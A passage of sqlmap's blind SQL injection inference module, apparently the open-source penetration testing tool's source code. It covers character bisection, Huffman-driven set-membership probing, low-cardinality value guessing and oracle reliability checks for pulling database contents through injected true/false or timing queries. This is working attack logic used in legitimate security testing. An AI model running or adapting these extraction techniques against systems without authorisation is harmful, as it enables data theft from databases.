#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import division

import heapq
import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import getFileItems
from lib.core.common import getPartRun
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import openFile
from lib.core.common import predictValue
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import isDigit
from lib.core.common import isListLike
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import HUFFMAN_PROBE_LIMIT
from lib.core.settings import HUFFMAN_PRIOR_WEIGHTS
from lib.core.settings import CATALOG_IDENTIFIERS_PRIOR_PEAK
from lib.core.settings import DUMP_CHARSET_STABLE_ROWS
from lib.core.settings import LOW_CARDINALITY_MAX_GUESSES
from lib.core.settings import LOW_CARDINALITY_THRESHOLD
from lib.core.settings import NAME_PREDICTION_CONTEXTS
from lib.core.settings import NAME_MARKOV_ORDER
from lib.core.settings import ORACLE_LITMUS_CHECK_EVERY
from lib.core.settings import PREDICTION_FEEDBACK_MAX_ITEMS
from lib.core.settings import PREDICTION_FEEDBACK_MAX_LENGTH
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import MAX_BISECTION_LENGTH
from lib.core.settings import MAX_REVALIDATION_STEPS
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_HEX_VALUE_MARKER
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.safe2bin import safecharencode
from lib.utils.xrange import xrange
from thirdparty import six

# Sentinel returned by the opt-in Huffman retrieval (--huffman) meaning "this character is
# outside the ASCII model (e.g. multi-byte/Unicode) - defer to the classic bisection".
_HUFFMAN_FALLBACK = object()

# Cache of character-level Markov priors keyed by (order, scale, dbms); built once per process
_huffmanPriorCache = {}

def normalizedExpression(expression):
    """
    Row-independent form of a per-row retrieval expression: the paginated offset/limit that varies
    from row to row is masked so every row of the same column maps to a single key. Used to group a
    column's values for low-cardinality guessing and for its per-column online Huffman model.

    >>> normalizedExpression("SELECT name FROM users LIMIT 3,1") == normalizedExpression("SELECT name FROM users LIMIT 7,1")
    True
    """

    retVal = expression

    for pattern in (r"\bLIMIT\s+\d+\s*,\s*\d+", r"\bLIMIT\s+\d+\s+OFFSET\s+\d+", r"\bOFFSET\s+\d+", r"\bLIMIT\s+\d+", r"\bROWNUM\b\s*[<>=]+\s*\d+", r"\bTOP\s+\d+", r"\bFETCH\s+(?:FIRST|NEXT)\s+\d+"):
        retVal = re.sub(pattern, lambda match: re.sub(r"\d+", "?", match.group(0)), retVal, flags=re.I)

    return retVal

def getHuffmanPrior(order, scale, dbms=None):
    """
    Character-level order-N Markov model {context: {ordinal: count}} used to warm the Huffman
    set-membership tree during blind NAME enumeration (so it predicts from the first character rather
    than cold). Trained on the app-identifier wordlists (common-tables/common-columns) plus, when the
    back-end is fingerprinted, the system/catalog identifiers harvested for that DBMS (from the matching
    [<DBMS>] section of catalog-identifiers.txt - a single global model dilutes across dialects).
    Per-context counts are scaled to a peak of `scale`. Retrieval is correct regardless of this model.
    """

    if (order, scale, dbms) in _huffmanPriorCache:
        return _huffmanPriorCache[(order, scale, dbms)]

    prior = {}
    names = []

    for path in (paths.COMMON_COLUMNS, paths.COMMON_TABLES):
        try:
            names.extend(getFileItems(path))
        except Exception:
            pass

    if dbms:
        try:
            with openFile(paths.CATALOG_IDENTIFIERS, "r", errors="ignore") as f:
                section = None
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if line.startswith('[') and line.endswith(']'):
                        section = line[1:-1]
                    elif section == dbms:
                        names.append(line)
        except Exception:
            pass

    for name in names:
        terminated = name + "\x00"
        for i in xrange(len(terminated)):
            ordinal = ord(terminated[i])
            if ordinal < 128:
                counts = prior.setdefault(terminated[max(0, i - order):i], {})
                counts[ordinal] = counts.get(ordinal, 0) + 1

    for counts in prior.values():
        peak = max(counts.values()) or 1
        for ordinal in counts:
            counts[ordinal] = max(1, int(round(counts[ordinal] * float(scale) / peak)))

    _huffmanPriorCache[(order, scale, dbms)] = prior
    return prior

def contextWeights(model, prior, order, prefix):
    """
    Combined next-character weights P(next | last `order` chars) from the per-run online `model` plus
    the optional shipped Markov `prior`, backing off to shorter contexts (Katz-style) when the deepest
    context has not been seen yet. The online model is snapshotted under kb.locks.prediction because
    value-parallel workers may mutate it concurrently (a bare iteration could otherwise raise).
    """

    weights = {}
    context = prefix[-order:] if order > 0 else ""

    while True:
        with kb.locks.prediction:
            online = dict(model.get(context) or ())
        for source in (online, prior.get(context) if prior is not None else None):
            if source:
                for symbol, count in source.items():
                    weights[symbol] = weights.get(symbol, 0) + count

        if weights or not context:
            break

        context = context[1:]

    return weights

def valueMatchCondition(expressionUnescaped, value):
    """
    Boolean SQL that is TRUE iff (expressionUnescaped) equals the whole `value` (extracted so far as a
    string), or None when a whole-value equality cannot be trusted and the caller must fall back to
    per-character extraction. Used by low-cardinality guessing and by the value-parallel self-verification.

    Returns None for values containing non-ASCII characters: those are extracted correctly byte-wise by
    the classic bisection, but a single quoted/CHAR()-encoded literal may not round-trip to the same
    bytes on every back-end, so a whole-value "=" could spuriously miss (and, for verification, drive a
    needless re-extraction). ASCII values compare reliably.

    On SQLite (dynamically typed) the dump's COALESCE(col, ...) wrapper loses column affinity, so for a
    numeric column "1 = '1'" is FALSE and the quoted form would never hit; there we ALSO test the bare-
    number form. That extra form is emitted ONLY for SQLite: on strictly-typed engines (e.g. PostgreSQL)
    "text = 1" is a hard type error that would abort the whole boolean, and there the expression is already
    text-cast so the quoted form matches anyway. Correctness is unaffected either way - this only decides
    whether a whole-value shortcut hits or falls back to per-character extraction.

    >>> valueMatchCondition("q", "abc").count("OR")
    0
    >>> valueMatchCondition("q", u"caf\\xe9") is None
    True
    """

    if value is None or any(ord(_) >= 128 for _ in value):
        return None

    quoted = unescaper.escape("'%s'" % value) if "'" not in value else unescaper.escape("%s" % value, quote=False)
    condition = "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, quoted)

    if re.match(r"\A-?\d+(\.\d+)?\Z", value) and Backend.getIdentifiedDbms() == DBMS.SQLITE:
        condition = "(%s OR (%s)%s%s)" % (condition, expressionUnescaped, INFERENCE_EQUALS_CHAR, value)

    return condition

def oracleReliabilityLitmus(expressionUnescaped, value, timeBasedCompare):
    """
    Known-answer differential health-check on the inference oracle, using the value just extracted.
    Fires TWO probes on the SAME cell: "(expr) = value" (must be TRUE) and "(expr) = <value with one
    character corrupted>" (must be FALSE). A healthy oracle answers TRUE/FALSE; an always-true channel
    (e.g. a WAF returning 200 for everything, a reads-everything-true endpoint) trips the FALSE probe,
    and a flaky/degraded one trips either - so silent data corruption becomes a detectable signal.

    Returns True if the oracle behaved consistently (or the check is not applicable), False on a detected
    inconsistency. Skips (returns True) for values valueMatchCondition() cannot reliably compare (non-ASCII).
    """

    if not value or valueMatchCondition(expressionUnescaped, value) is None:
        return True

    # a definitely-different copy: flip the last character to a neighbour that cannot equal it
    corrupt = value[:-1] + ("a" if value[-1] != "a" else "b")
    corruptCondition = valueMatchCondition(expressionUnescaped, corrupt)
    if corruptCondition is None:
        return True

    try:
        truthy = agent.suffixQuery(agent.prefixQuery(getTechniqueData().vector.replace(INFERENCE_MARKER, valueMatchCondition(expressionUnescaped, value))))
        mustBeTrue = Request.queryPage(agent.payload(newValue=truthy), timeBasedCompare=timeBasedCompare, raise404=False)
        incrementCounter(getTechnique())

        falsy = agent.suffixQuery(agent.prefixQuery(getTechniqueData().vector.replace(INFERENCE_MARKER, corruptCondition)))
        mustBeFalse = Request.queryPage(agent.payload(newValue=falsy), timeBasedCompare=timeBasedCompare, raise404=False)
        incrementCounter(getTechnique())
    except Exception:
        return True   # a transient hiccup is not evidence of an unreliable oracle

    return bool(mustBeTrue) and not bool(mustBeFalse)

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    abortedFlag = False
    showEta = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0
    columnKey = None

    if payload is None:
        return 0, None

    if charsetType is None and conf.charset:
        # conf.charset is fixed for the whole run; compute the table once, not per bisection() call
        if kb.cache.charsetAsciiTbl is None:
            kb.cache.charsetAsciiTbl = sorted(set(ord(_) for _ in conf.charset))
        asciiTbl = kb.cache.charsetAsciiTbl
    else:
        asciiTbl = getCharset(charsetType)

    threadData = getCurrentThreadData()
    threadData.lowCardHit = False  # set when this value is confirmed by the (self-verifying) low-card guess
    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:
            pass
        elif PARTIAL_HEX_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")

            if retVal and conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        elif PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal and not conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        else:
            infoMsg = "resumed: %s" % safecharencode(retVal)
            logger.info(infoMsg)

            return 0, retVal

    if Backend.isDbms(DBMS.MCKOI):
        match = re.search(r"\ASELECT\b(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            original = queries[Backend.getIdentifiedDbms()].inference.query
            right = original.split('<')[1]
            payload = payload.replace(right, "(SELECT %s FROM %s)" % (right, match.group(2).strip()))
            expression = match.group(1).strip()

    elif Backend.isDbms(DBMS.FRONTBASE):
        match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
            payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
            expression = match.group(2).strip()

    try:
        # kb.partRun tags the enumeration context so predictive inference (predictValue) fires for BOTH
        # the value-parallel and the classic serial name-enumeration paths. It is derived from the call
        # stack here (alias form for prediction; raw for API/JSON tagging); the derivation only overwrites
        # when it finds a match, so it does NOT clobber the context the value-parallel helper set for its
        # worker threads (whose call stack does not include the enumeration method -> getPartRun is None).
        derivedPartRun = getPartRun(alias=not (conf.api or conf.reportJson))
        if derivedPartRun is not None:
            kb.partRun = derivedPartRun

        if partialValue:
            firstChar = len(partialValue)
        elif re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            firstChar = 0
        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
            firstChar = int(conf.firstChar) - 1
            if kb.fileReadMode:
                firstChar <<= 1
        elif hasattr(firstChar, "isdigit") and firstChar.isdigit() or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1
        else:
            firstChar = 0

        if re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            lastChar = 0
        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
            lastChar = int(conf.lastChar)
            if kb.fileReadMode:  # Note: file content is retrieved hex-encoded (2 chars per byte), mirroring the firstChar handling above
                lastChar <<= 1
        elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
            lastChar = int(lastChar)
        else:
            lastChar = 0

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        # Row-independent key for this column (pagination offset masked), grouping all of a column's
        # rows for low-cardinality guessing and for its own per-column online Huffman model.
        columnKey = normalizedExpression(expression) if dump else None

        # Low-cardinality whole-value guessing: when the distinct values already seen for this column are
        # few (<= LOW_CARDINALITY_THRESHOLD), confirm the current cell by equality against each of them
        # (one request on a hit) before per-character extraction - a large win on the enum/flag/status/
        # category/type columns that dominate real tables. Self-verifying (a wrong candidate simply fails).
        # Especially valuable for TIME-BASED blind: a hit confirms the whole value in a single delayed
        # request instead of ~7 delays/char x N chars. The repetition gate below ensures it only ever fires
        # on genuinely low-cardinality columns, so unique identifier names never pay a wasted probe/delay.
        if columnKey is not None and not partialValue:
            # Snapshot the shared cache under the lock (value-parallel workers may mutate it concurrently).
            with kb.locks.prediction:
                seen = dict(kb.lowCardCache.get(columnKey) or ())
            # Arm only once SOME value has repeated (max count >= 2): that is the proof the column is
            # low-cardinality, so an all-unique column (primary key, hash, free text) never spends a probe.
            # Once armed, try at most LOW_CARDINALITY_MAX_GUESSES candidates (most frequent first), so a
            # column that trips the threshold with many near-unique values wastes only a bounded number of
            # probes. A wrong guess costs one probe (self-verifying); a right one confirms the whole value.
            if seen and len(seen) <= LOW_CARDINALITY_THRESHOLD and max(seen.values()) >= 2:
                for candidate in sorted(seen, key=lambda value: -seen[value])[:LOW_CARDINALITY_MAX_GUESSES]:
                    matchCondition = valueMatchCondition(expressionUnescaped, candidate)
                    if matchCondition is None:   # non-ASCII: no reliable whole-value equality, extract per-char
                        continue
                    forgedQuery = agent.suffixQuery(agent.prefixQuery(getTechniqueData().vector.replace(INFERENCE_MARKER, matchCondition)))
                    hit = Request.queryPage(agent.payload(newValue=forgedQuery), timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())
                    if hit and timeBasedCompare:
                        # A single time-based boolean is noisy; confirm the whole-value hit with a
                        # not-equals check (validateChar spirit) before trusting it, so timing jitter can
                        # never ship a wrong low-cardinality value. Still ~2 delayed requests/value vs the
                        # ~7-delays/char x N of full extraction.
                        notEqualsQuery = agent.suffixQuery(agent.prefixQuery(getTechniqueData().vector.replace(INFERENCE_MARKER, "NOT(%s)" % matchCondition)))
                        hit = not Request.queryPage(agent.payload(newValue=notEqualsQuery), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())
                    if hit:
                        threadData.lowCardHit = True
                        return getCounter(getTechnique()), candidate

        # Model driving the Huffman set-membership tree. Name enumeration keys on the enumeration context
        # and is seeded with the fingerprinted back-end's identifier prior, so the tree predicts a name
        # from the first character (structured, low-entropy identifiers). A data dump uses a PER-COLUMN
        # order-0 model: each column learns its own character distribution, so a column restricted to few
        # characters (hex/uuid, digits, dates, a constant/NULL placeholder) is forced from those alone
        # (e.g. ~4 requests/char on hex instead of ~6, ~1 on a constant) with no cross-column dilution.
        # Order 0 needs no sequential prefix, so it works under the position-parallel (per-value) threads
        # too; a higher-order per-column model was measured to lose to its own cold-start, so order 0 it is.
        if kb.partRun in NAME_PREDICTION_CONTEXTS:
            huffmanKey, huffmanOrder = kb.partRun, NAME_MARKOV_ORDER
            huffmanPrior = getHuffmanPrior(NAME_MARKOV_ORDER, CATALOG_IDENTIFIERS_PRIOR_PEAK, Backend.getIdentifiedDbms())
        else:
            huffmanKey, huffmanOrder, huffmanPrior = columnKey, 0, None

        if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):
            length = int(length)
        else:
            length = None

        if length == 0:
            return 0, ""

        if length and (lastChar > 0 or firstChar > 0):
            length = min(length, lastChar or length) - firstChar

        if length and length > MAX_BISECTION_LENGTH:
            length = None

        showEta = conf.eta and isinstance(length, int)

        if kb.bruteMode:
            numThreads = 1
        else:
            numThreads = min(conf.threads or 0, length or 0) or 1

        if showEta:
            progress = ProgressBar(maxValue=length)

        if numThreads > 1:
            if not timeBasedCompare or kb.forceThreads:
                debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not timeBasedCompare:
            warnMsg = "running in a single-thread mode. Please consider "
            warnMsg += "usage of option '--threads' for faster data retrieval"
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            if isinstance(length, int) and numThreads > 1:
                dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
            else:
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))

        def tryHint(idx):
            with kb.locks.hint:
                hintValue = kb.hintValue

            if payload is not None and len(hintValue or "") > 0 and len(hintValue) >= idx:
                if "'%s'" % CHAR_INFERENCE_MARK in payload:
                    posValue = hintValue[idx - 1]
                else:
                    posValue = ord(hintValue[idx - 1])

                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                forgedPayload = agent.extractPayload(payload) or ""
                forgedPayload = forgedPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return hintValue[idx - 1]

            with kb.locks.hint:
                kb.hintValue = ""

            return None

        def validateChar(idx, value):
            """
            Used in inference - in time-based SQLi if original and retrieved value are not equal there will be a deliberate delay
            """

            threadData = getCurrentThreadData()

            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
            else:
                # e.g.: ... > '%c' -> ... > ORD(..)
                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(value))
                forgedPayload = validationPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))

            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

            if result and timeBasedCompare and getTechniqueData().trueCode:
                result = threadData.lastCode == getTechniqueData().trueCode
                if not result:
                    warnMsg = "detected HTTP code '%s' in validation phase is differing from expected '%s'" % (threadData.lastCode, getTechniqueData().trueCode)
                    singleTimeWarnMessage(warnMsg)

            incrementCounter(getTechnique())

            return result

        def huffmanChar(idx):
            """
            Adaptive retrieval of a single character using set-membership ("... IN (...)")
            questions driven by a Huffman tree built from an online frequency model of the data
            retrieved so far (used by default for blind table dumps; '--no-huffman' disables it).
            The expected number of requests approaches the
            data's entropy (fewer on text/hex), while uniform/binary data yields a balanced tree
            (i.e. no penalty versus the classic bisection).

            Correctness does NOT depend on the (shared, racily updated) model: the tree is a
            decision tree over the whole 0..127 range plus a dedicated ESCAPE leaf. At every node
            the child that does NOT contain ESCAPE is the one tested, so any value outside 0..127
            (e.g. multi-byte/Unicode) fails every membership test, lands on ESCAPE and is handed
            back to the classic bisection. Returns the character, or None to fall back.
            """
            ESCAPE = -1
            model = kb.huffmanModel.setdefault(huffmanKey, {})
            threadData = getCurrentThreadData()

            # Next-character weights P(next | last huffmanOrder chars) from this retrieval's own online
            # model plus, for name enumeration, the shipped identifier prior (so the tree is warm from the
            # first character); order 0 collapses to the classic single-context adaptive model. Retrieval
            # is correct regardless of the weights (the tree spans the whole range plus an ESCAPE leaf), so
            # the model - even raced under threads - only ever affects speed, never the returned value.
            context = partialValue[-huffmanOrder:] if huffmanOrder > 0 else ""
            weights = contextWeights(model, huffmanPrior, huffmanOrder, partialValue)

            heap = []
            for order, ordinal in enumerate(xrange(128)):
                heapq.heappush(heap, (weights.get(ordinal, 0) + HUFFMAN_PRIOR_WEIGHTS.get(ordinal, 1), order, (ordinal,)))
            heapq.heappush(heap, (max(weights.get(ESCAPE, 0), 1), 128, (ESCAPE,)))

            counter = 129
            while len(heap) > 1:
                w1, _, n1 = heapq.heappop(heap)
                w2, _, n2 = heapq.heappop(heap)
                heapq.heappush(heap, (w1 + w2, counter, (n1, n2)))
                counter += 1
            node = heap[0][2]

            def _concrete(n):
                if len(n) == 1:
                    return [] if n[0] == ESCAPE else [n[0]]
                return _concrete(n[0]) + _concrete(n[1])

            def _hasEscape(n):
                return n[0] == ESCAPE if len(n) == 1 else (_hasEscape(n[0]) or _hasEscape(n[1]))

            template = payload.replace("%s%s" % (INFERENCE_GREATER_CHAR, "%d"), " IN (%s)", 1)

            while len(node) == 2:
                left, right = node

                if _hasEscape(left):
                    testNode, otherNode = right, left
                elif _hasEscape(right):
                    testNode, otherNode = left, right
                else:
                    leftLeaves, rightLeaves = _concrete(left), _concrete(right)
                    testNode, otherNode = (left, right) if len(leftLeaves) <= len(rightLeaves) else (right, left)

                testSet = _concrete(testNode)
                setExpr = ','.join(str(_) for _ in testSet)
                forgedPayload = safeStringFormat(template, (expressionUnescaped, idx, setExpr))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                # Guard against target-side length limits / WAFs that reject the (potentially long)
                # "IN (...)" list: an HTTP error code that is not the technique's own true/false code means
                # this membership query was rejected (e.g. 414 URI Too Long, 413, 400, 403), so the walk
                # cannot be trusted. Abandon it and hand the character to the classic short-query ('>' / '=')
                # bisection, which re-extracts and validates it; the escape counter in getChar() latches
                # Huffman off (kb.disableHuffman) if the rejection keeps happening. Gated on >= 400 so a
                # normal content-based (200/200) response never trips it.
                if not timeBasedCompare and threadData.lastCode is not None and threadData.lastCode >= 400 and (getTechniqueData() is None or threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)):
                    return _HUFFMAN_FALLBACK

                node = testNode if result else otherNode

            value = node[0]

            if value == ESCAPE:
                with kb.locks.prediction:
                    model.setdefault(context, {})[ESCAPE] = model.setdefault(context, {}).get(ESCAPE, 0) + 1
                return _HUFFMAN_FALLBACK

            if value == 0:
                # ORD(MID(..)) of an empty (past end-of-string) character is 0; mirror the classic
                # bisection and signal end-of-string (do NOT pollute the model with the sentinel).
                return None

            # One-time safety validation: cross-check the first set-membership result with a short
            # equality probe. Unlike the long IN() lists, a single '=N' comparison cannot be
            # truncated/mangled by a parameter-length limit or a WAF, so it is a trustworthy oracle.
            # If it disagrees, the IN() channel is unreliable here: latch the technique off so the
            # classic '>' bisection takes over for the rest of the run (graceful fallback).
            if not kb.huffmanValidated:
                verifyPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, value))
                verified = Request.queryPage(verifyPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())
                if verified:
                    kb.huffmanValidated = True
                else:
                    kb.disableHuffman = True
                    return _HUFFMAN_FALLBACK

            with kb.locks.prediction:
                model.setdefault(context, {})[value] = model.setdefault(context, {}).get(value, 0) + 1
            return decodeIntToUnicode(value)

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None, restricted=False):
            """
            continuousOrder means that distance between each two neighbour's
            numerical values is exactly 1

            restricted means charTbl is a narrowed per-column observed range (time-based only): a character
            landing outside it fails validateChar and is re-extracted over the full charset.
            """

            threadData = getCurrentThreadData()

            result = tryHint(idx)

            if result:
                return result

            # Huffman set-membership applies to boolean-based dumps and name enumeration. It stays off for
            # time-based, where each membership step is timing-noisy and lacks per-character validation
            # (measured to trade accuracy for little/no gain there); time-based relies on plain bisection
            # plus low-cardinality whole-value guessing instead.
            if (not conf.noHuffman and not kb.disableHuffman and (dump or kb.partRun in NAME_PREDICTION_CONTEXTS) and continuousOrder and charsetType is None and not timeBasedCompare
                    and ("%s%s" % (INFERENCE_GREATER_CHAR, "%d")) in payload
                    and ("'%s'" % CHAR_INFERENCE_MARK) not in payload):
                kb.huffmanProbes = (kb.huffmanProbes or 0) + 1
                result = huffmanChar(idx)
                if result is not _HUFFMAN_FALLBACK:
                    return result
                # huffman declined this character (Unicode/escape, or failed the validation probe).
                # If the set-membership channel keeps escaping it is not paying off here (trimmed/
                # blocked long payloads, or non-ASCII-heavy data) -> latch off so the classic '>'
                # bisection takes over efficiently for the rest of the run.
                kb.huffmanEscapes = (kb.huffmanEscapes or 0) + 1
                if kb.huffmanProbes >= HUFFMAN_PROBE_LIMIT and kb.huffmanEscapes * 2 >= kb.huffmanProbes:
                    kb.disableHuffman = True

            if charTbl is None:
                charTbl = type(asciiTbl)(asciiTbl)

            originalTbl = type(charTbl)(charTbl)

            if kb.disableShiftTable:
                shiftTable = None
            elif continuousOrder and shiftTable is None:
                # Used for gradual expanding into unicode charspace
                shiftTable = [2, 2, 3, 3, 3]

            if "'%s'" % CHAR_INFERENCE_MARK in payload:
                for char in ('\n', '\r'):
                    if ord(char) in charTbl:
                        if not isinstance(charTbl, list):
                            charTbl = list(charTbl)
                        charTbl.remove(ord(char))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minValue = charTbl[0]
            firstCheck = False
            lastCheck = False
            unexpectedCode = False

            if continuousOrder:
                while len(charTbl) > 1:
                    position = None

                    if charsetType is None:
                        if not firstCheck:
                            try:
                                try:
                                    lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                                except IndexError:
                                    lastChar = None
                                else:
                                    if 'a' <= lastChar <= 'z':
                                        position = charTbl.index(ord('a') - 1)  # 96
                                    elif 'A' <= lastChar <= 'Z':
                                        position = charTbl.index(ord('A') - 1)  # 64
                                    elif '0' <= lastChar <= '9':
                                        position = charTbl.index(ord('0') - 1)  # 47
                            except ValueError:
                                pass
                            finally:
                                firstCheck = True

                        elif not lastCheck and numThreads == 1:  # not usable in multi-threading environment
                            if charTbl[(len(charTbl) >> 1)] < ord(' '):
                                try:
                                    # favorize last char check if current value inclines toward 0
                                    position = charTbl.index(1)
                                except ValueError:
                                    pass
                                finally:
                                    lastCheck = True

                    if position is None:
                        position = (len(charTbl) >> 1)

                    posValue = charTbl[position]
                    falsePayload = None

                    if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
                    else:
                        # e.g.: ... > '%c' -> ... > ORD(..)
                        markingValue = "'%s'" % CHAR_INFERENCE_MARK
                        unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                        forgedPayload = payload.replace(markingValue, unescapedCharValue)
                        forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)

                    if timeBasedCompare:
                        if kb.responseTimeMode:
                            kb.responseTimePayload = falsePayload
                        else:
                            kb.responseTimePayload = None

                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

                    incrementCounter(getTechnique())

                    if not timeBasedCompare and getTechniqueData() is not None:
                        unexpectedCode |= threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)
                        if unexpectedCode:
                            if threadData.lastCode is not None:
                                warnMsg = "unexpected HTTP code '%s' detected." % threadData.lastCode
                            else:
                                warnMsg = "unexpected response detected."

                            warnMsg += " Will use (extra) validation step in similar cases"

                            singleTimeWarnMessage(warnMsg)

                    if result:
                        minValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[position:]
                        else:
                            # xrange() - extended virtual charset used for memory/space optimization
